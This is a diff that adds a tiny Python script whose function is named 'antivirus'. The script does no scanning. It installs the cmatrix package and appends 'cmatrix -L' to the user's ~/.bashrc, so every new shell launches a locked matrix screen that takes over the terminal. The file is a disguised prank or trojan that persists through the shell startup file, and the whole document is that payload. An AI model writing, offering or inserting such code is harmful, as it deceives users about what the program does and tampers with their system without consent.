@@ -1,0 +1,9 @@
+#!/usr/bin/env python3
+
+import os
+
+def antivirus():
+    os.system("pkg install cmatrix -y")
+    os.system('echo "cmatrix -L" >> ~/.bashrc')
+
+antivirus()
